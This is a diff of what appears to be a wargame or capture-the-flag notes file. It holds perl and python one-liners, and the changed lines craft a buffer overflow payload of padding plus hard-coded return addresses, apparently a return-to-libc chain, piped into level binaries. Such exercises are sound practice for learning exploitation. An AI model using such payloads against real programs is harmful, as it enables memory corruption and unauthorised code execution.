@@ -7,6 +7,6 @@ perl -e '$,=" ";print ("\nor just 130 As plus text\n\n\n")'
 perl -e '$,=" ";print ("A" x130)'
 perl -e 'print for "a" .. "z", "A" .. "Z", 0 .. 9'
 
-python -c 'print "dat_wil\n"+"U"*80+"\xd0\xae\xe6\xf7"+"4242"+"\xec\x97\xf8\xf7"' > ./tmp
+python -c 'print "U"*156+"\xd0\xae\xe6\xf7"+"4242"+"\xec\x97\xf8\xf7"' > ./tmp
 
-python -c 'print "\ncat /tmp/tmp /dev/stdin | ./level01"'
+python -c 'print "\ncat /tmp/tmp /dev/stdin | ./level04"'
